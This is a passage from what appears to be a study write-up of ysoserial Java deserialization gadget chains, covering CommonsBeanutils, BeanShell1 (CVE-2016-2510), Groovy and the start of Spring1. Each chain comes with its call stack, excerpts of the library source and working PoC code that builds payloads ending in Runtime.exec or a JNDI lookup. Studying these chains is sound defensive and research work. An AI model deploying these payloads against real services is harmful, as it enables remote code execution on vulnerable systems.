<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;   </span><br><span class="line">	<span class="keyword">try</span> &#123;  </span><br><span class="line">	    <span class="keyword">return</span> newTransformer().getOutputProperties();  </span><br><span class="line">	&#125;  </span><br><span class="line">	<span class="keyword">catch</span> (TransformerConfigurationException e) &#123;  </span><br><span class="line">	    <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">	&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In this method, the method <code>newTransformer()</code> is called, which serves as an entry to executing arbitrary code([[Java Deserialize Vulnerabilities ysoserial study#TemplatesImpl exploit|here]]).<br>The class <code>BeanComparator</code> in <code>commons-beanutils</code> project is disclosed for triggering this flaw in the deserialization procession.<br>In its <code>compare()</code> method:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( T o1, T o2 )</span> &#123;  </span><br><span class="line">   ...</span><br><span class="line">	<span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );  </span><br><span class="line">	<span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In <code>getSimpleProperty()</code> method:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getSimpleProperty</span><span class="params">(Object bean, String name)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="type">PropertyDescriptor</span> <span class="variable">descriptor</span> <span class="operator">=</span>  </span><br><span class="line">        getPropertyDescriptor(bean, name);  </span><br><span class="line">	<span class="keyword">if</span> (descriptor == <span class="literal">null</span>) &#123;  </span><br><span class="line">	    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(<span class="string">&quot;Unknown property &#x27;&quot;</span> +  </span><br><span class="line">	            name + <span class="string">&quot;&#x27; on class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span> );  </span><br><span class="line">	&#125;  </span><br><span class="line">	<span class="type">Method</span> <span class="variable">readMethod</span> <span class="operator">=</span> getReadMethod(bean.getClass(), descriptor);  </span><br><span class="line">	<span class="keyword">if</span> (readMethod == <span class="literal">null</span>) &#123;  </span><br><span class="line">	    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(<span class="string">&quot;Property &#x27;&quot;</span> + name +  </span><br><span class="line">	            <span class="string">&quot;&#x27; has no getter method in class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);  </span><br><span class="line">	&#125;  </span><br><span class="line">	  </span><br><span class="line">	<span class="comment">// Call the property getter and return the value  </span></span><br><span class="line">	<span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In this method, firstly it creates a <code>PropertyDescriptor</code> of the input bean and gets the getter according to the property name. When the getter is invoked, our <code>TemplatesImpl</code> is ignited.</p>
<p>Poc:<br>Note that, set the <code>property</code> member of <code>BeanComparator</code> to  <code>lowestSetBit</code> so as to successfully add initial value to queue. You can also set it to null.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);  </span><br><span class="line"><span class="comment">// mock method name until armed  </span></span><br><span class="line"><span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;lowestSetBit&quot;</span>);<span class="comment">// or null</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator  </span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);  </span><br><span class="line"><span class="comment">// stub data for replacement later  </span></span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));  </span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);  </span><br><span class="line">Reflections.setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure>

<h3 id="Using-JdbcRowSetImpl-CB3"><a href="#Using-JdbcRowSetImpl-CB3" class="headerlink" title="Using JdbcRowSetImpl (CB3)"></a>Using JdbcRowSetImpl (CB3)</h3><p>The <code>JdbcRowSetImpl</code> class has a property named <code>databaseMetaData</code> whose getter calls <code>connect()</code> to look up a JNDI URL.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> DatabaseMetaData <span class="title function_">getDatabaseMetaData</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">    <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> connect();  </span><br><span class="line">    <span class="keyword">return</span> con.getMetaData();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;lowestSetBit&quot;</span>);  </span><br><span class="line"><span class="type">JdbcRowSetImpl</span> <span class="variable">rs</span>         <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();  </span><br><span class="line">rs.setDataSourceName(jndiURL);  </span><br><span class="line">rs.setMatchColumn(<span class="string">&quot;xx&quot;</span>);  </span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);  </span><br><span class="line">  </span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));  </span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;databaseMetaData&quot;</span>);  </span><br><span class="line">Reflections.setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;rs, rs&#125;);  </span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="BeanShell"><a href="#BeanShell" class="headerlink" title="BeanShell"></a>BeanShell</h2><h3 id="BeanShell1-CVE-2016-2510"><a href="#BeanShell1-CVE-2016-2510" class="headerlink" title="BeanShell1  CVE-2016-2510"></a>BeanShell1  <a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-gxg6-rc6c-v673" title="CVE-2016-2510">CVE-2016-2510</a></h3><blockquote>
<p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8<br>org.beanshell:bsh:2.0b5 (fixed in 2.0b6)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line">invokeMethod:<span class="number">233</span>, This (bsh)</span><br><span class="line">invokeMethod:<span class="number">174</span>, This (bsh)</span><br><span class="line">invokeImpl:<span class="number">194</span>, XThis$Handler (bsh)</span><br><span class="line">invoke:<span class="number">131</span>, XThis$Handler (bsh)</span><br><span class="line">compare:-<span class="number">1</span>, $Proxy5 (com.sun.proxy)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">796</span>, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure>

<p>Firstly, let’s take a glance into <code>bsh.XThis</code>. It has a member named by <code>invocationHandler</code> with <code>XThis$Handler</code> type. <code>Handler</code> implements <code>InvocationHandler</code> interface and delegates methods invocation request to the method with the same signature in current namespace. To check this, step into <code>This.invokeMethod()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invokeMethod</span><span class="params">(   </span></span><br><span class="line"><span class="params">   String methodName, Object [] args,   </span></span><br><span class="line"><span class="params">Interpreter interpreter, CallStack callstack, SimpleNode callerInfo,   </span></span><br><span class="line"><span class="params"><span class="type">boolean</span> declaredOnly  )</span>   </span><br><span class="line">   <span class="keyword">throws</span> EvalError  </span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	Class [] types = Types.getTypes( args );  </span><br><span class="line">	<span class="type">BshMethod</span> <span class="variable">bshMethod</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">	<span class="keyword">try</span> &#123;  </span><br><span class="line">	   bshMethod = namespace.getMethod( methodName, types, declaredOnly );  </span><br><span class="line">	&#125; <span class="keyword">catch</span> ( UtilEvalError e ) &#123;  </span><br><span class="line">	   <span class="comment">// leave null  </span></span><br><span class="line">	&#125;  </span><br><span class="line">	  </span><br><span class="line">	<span class="keyword">if</span> ( bshMethod != <span class="literal">null</span> )  </span><br><span class="line">	   <span class="keyword">return</span> bshMethod.invoke( args, interpreter, callstack, callerInfo );</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This means that we can extract the <code>invocationHandler</code> of a <code>XThis</code> object and build a proxy on it. When a method like <code>compare()</code> is invoked on this proxy, it would result in the invocation of the bsh method <code>compare()</code> defined in current namespace. And the <code>invocationHandler</code> does not require any modification. What we should do is to define a <code>compare()</code> method by bsh interpreter.</p>
<p>Poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> BeanShellUtil.makeBeanShellPayload(command);  </span><br><span class="line"><span class="comment">// payload: compare(Object su18, Object su19) &#123;new java.lang.ProcessBuilder(new String[]&#123;&quot;calc.exe&quot;&#125;</span></span><br><span class="line"><span class="type">Interpreter</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Interpreter</span>();  </span><br><span class="line">Reflections.getMethodAndInvoke(i, <span class="string">&quot;setu&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Object.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;bsh.cwd&quot;</span>, <span class="string">&quot;.&quot;</span>&#125;);  </span><br><span class="line">i.eval(payload);  </span><br><span class="line"><span class="type">XThis</span> <span class="variable">xt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XThis</span>(i.getNameSpace(), i);  </span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) Reflections.getField(xt.getClass(), <span class="string">&quot;invocationHandler&quot;</span>).get(xt);  </span><br><span class="line">Comparator&lt;? <span class="built_in">super</span> Object&gt; comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Comparator.class&#125;, handler);  </span><br><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);  </span><br><span class="line">Object[] queue = &#123;Integer.valueOf(<span class="number">1</span>), Integer.valueOf(<span class="number">1</span>)&#125;;  </span><br><span class="line">Reflections.setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, queue);  </span><br><span class="line">Reflections.setFieldValue(priorityQueue, <span class="string">&quot;size&quot;</span>, Integer.valueOf(<span class="number">2</span>));  </span><br><span class="line"><span class="keyword">return</span> priorityQueue;</span><br></pre></td></tr></table></figure>

<h2 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h2><blockquote>
<p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8<br>org.codehaus.groovy:groovy:2.3.9</p>
</blockquote>
<p>This gadget can use both <code>AnnotationInvocationHandler</code> or <code>PriorityQueue</code>, we use the later as example.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line">execute:<span class="number">530</span>, ProcessGroovyMethods (org.codehaus.groovy.runtime)</span><br><span class="line">doMethodInvoke:-<span class="number">1</span>, dgm$<span class="number">748</span> (org.codehaus.groovy.runtime)</span><br><span class="line">invokeMethod:<span class="number">1207</span>, MetaClassImpl (groovy.lang)</span><br><span class="line">invokeMethod:<span class="number">1074</span>, MetaClassImpl (groovy.lang)</span><br><span class="line">invokeMethod:<span class="number">1016</span>, MetaClassImpl (groovy.lang)</span><br><span class="line">call:<span class="number">423</span>, Closure (groovy.lang)</span><br><span class="line">invokeCustom:<span class="number">51</span>, ConvertedClosure (org.codehaus.groovy.runtime)</span><br><span class="line">invoke:<span class="number">103</span>, ConversionHandler (org.codehaus.groovy.runtime)</span><br><span class="line">entrySet:-<span class="number">1</span>, $Proxy4 (com.sun.proxy)</span><br><span class="line">readObject:<span class="number">452</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br></pre></td></tr></table></figure>

<p>Poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">ConvertedClosure</span> <span class="variable">closure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(<span class="keyword">new</span> <span class="title class_">MethodClosure</span>(command, <span class="string">&quot;execute&quot;</span>), <span class="string">&quot;entrySet&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> Gadgets.createProxy(closure, Map.class);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(map);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> handler;</span><br></pre></td></tr></table></figure>

<p>The <code>ConvertedClosure</code> class is an <code>InvocationHandler</code> bounded to a single method, i.e. only if its bounded method can be invoked. And the invocation can be delegated to another <code>Closure</code>(here is <code>MethodClosure</code>).<br>Step into its super class <code>ConversionHandler</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">    <span class="type">VMPlugin</span> <span class="variable">plugin</span> <span class="operator">=</span> VMPluginFactory.getPlugin();  </span><br><span class="line">    <span class="keyword">if</span> (plugin.getVersion()&gt;=<span class="number">7</span> &amp;&amp; isDefaultMethod(method)) &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">handle</span> <span class="operator">=</span> handleCache.get(method);  </span><br><span class="line">        <span class="keyword">if</span> (handle == <span class="literal">null</span>) &#123;  </span><br><span class="line">            handle = plugin.getInvokeSpecialHandle(method, proxy);  </span><br><span class="line">            handleCache.put(method, handle);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> plugin.invokeHandle(handle, args);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!checkMethod(method)) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> invokeCustom(proxy, method, args);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (GroovyRuntimeException gre) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> ScriptBytecodeAdapter.unwrap(gre);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>, args);  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ite) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> ite.getTargetException();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We should make control dive into <code>invokeCustom()</code>.<br>Look at <code>ConvertedClosure</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invokeCustom</span><span class="params">(Object proxy, Method method, Object[] args)</span>  </span><br><span class="line"><span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">    <span class="keyword">if</span> (methodName!=<span class="literal">null</span> &amp;&amp; !methodName.equals(method.getName())) <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">return</span> ((Closure) getDelegate()).call(args);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In <code>MethodClosure</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">doCall</span><span class="params">(Object arguments)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> InvokerHelper.invokeMethod(getOwner(), method, arguments);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Finally, in <code>ProcessGroovyMethods</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title function_">execute</span><span class="params">(<span class="keyword">final</span> String self)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="keyword">return</span> Runtime.getRuntime().exec(self);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>So the whole procedure is:<br>deserialize <code>AnnotationInvocationHandler</code>  &#x3D;&gt;<br><code>entrySet()</code> is called upon <code>ConvertedClosure</code> &#x3D;&gt;<br>delegate to <code>MethodClosure</code> &#x3D;&gt;<br>call groovy integrated method <code>execute()</code></p>
<p>End.</p>
<h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><h3 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h3><blockquote>
<p>[!NOTE] pre-requirements<br>JDK1.7<br>org.springframework:spring-core:4.1.4.RELEASE</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line"></span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()</span><br><span class="line">		SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">			AnnotationInvocationHandler.invoke()</span><br><span class="line">				HashMap.get()</span><br><span class="line">		ReflectionUtils.findMethod()</span><br><span class="line">		SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">			AnnotationInvocationHandler.invoke()</span><br><span class="line">				HashMap.get()</span><br><span class="line">		ReflectionUtils.invokeMethod()</span><br><span class="line">			Method.invoke()</span><br><span class="line">				Templates(Proxy).newTransformer()</span><br><span class="line">					AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()</span><br><span class="line">						ObjectFactory(Proxy).getObject()</span><br><span class="line">							AnnotationInvocationHandler.invoke()</span><br><span class="line">								HashMap.get()</span><br><span class="line">						Method.invoke()</span><br><span class="line">							TemplatesImpl.newTransformer()</span><br><span class="line">								TemplatesImpl.getTransletInstance()</span><br><span class="line">									TemplatesImpl.defineTransletClasses()</span><br><span class="line">										TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="line">											Pwner*(Javassist-generated).&lt;<span class="keyword">static</span> init&gt;</span><br><span class="line">												Runtime.exec()</span><br></pre></td></tr></table></figure>

<h4 id="AnnotationInvocationHandler-special-functionality"><a href="#AnnotationInvocationHandler-special-functionality" class="headerlink" title="AnnotationInvocationHandler special functionality"></a>AnnotationInvocationHandler special functionality</h4><p>The <code>AnnotationInvocationHandler</code> class is able to overwrite a proxied method, return the designated value when call it. We can look at its <code>invoke()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>And <code>memberValues</code> is built within <code>readObject()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    ...</span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">	    ...</span><br><span class="line">	    mv.put(name, value);</span><br><span class="line">	    ...</span><br><span class="line">	&#125;</span><br><span class="line">	UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, mv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>There is an constraint that the type of <code>memberValues</code> should equals to that of the return type of the method to be hooked.</p>
<h4 id="Kick-off-MethodInvokeTypeProvider"><a href="#Kick-off-MethodInvokeTypeProvider" class="headerlink" title="Kick-off : MethodInvokeTypeProvider"></a>Kick-off : MethodInvokeTypeProvider</h4><p><code>MethodInvokeTypeProvider</code> class is an inner class of <code>org.springframework.core.SerializableTypeWrapper</code>. In its <code>readObject()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">   inputStream.defaultReadObject();  </span><br><span class="line">   <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(<span class="built_in">this</span>.provider.getType().getClass(), <span class="built_in">this</span>.methodName);  </span><br><span class="line">   <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="built_in">this</span>.provider.getType());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we can control <code>methodName</code> and <code>provider.getType()</code>, then we can execute any code.<br>By using the measure introduced [[Java Deserialize Vulnerabilities ysoserial study#AnnotationInvocationHandler special functionality|here]], we can hook <code>getType()</code> to return an object in <code>Type</code> class. It is expected to get a <code>TemplatesImpl</code> when call <code>getType()</code> and invoke its <code>newTransformer()</code>. So we need to introduce <code>ObjectFactoryDelegatingInvocationHandler</code>.</p>
<h4 id="ObjectFactoryDelegatingInvocationHandler"><a href="#ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="ObjectFactoryDelegatingInvocationHandler"></a>ObjectFactoryDelegatingInvocationHandler</h4><p>It is an inner class of <code>org.springframework.beans.factory.support.AutowireUtils</code>. It is an <code>InvocationHandler</code>. Let’s look at its <code>invoke()</code>:</p>
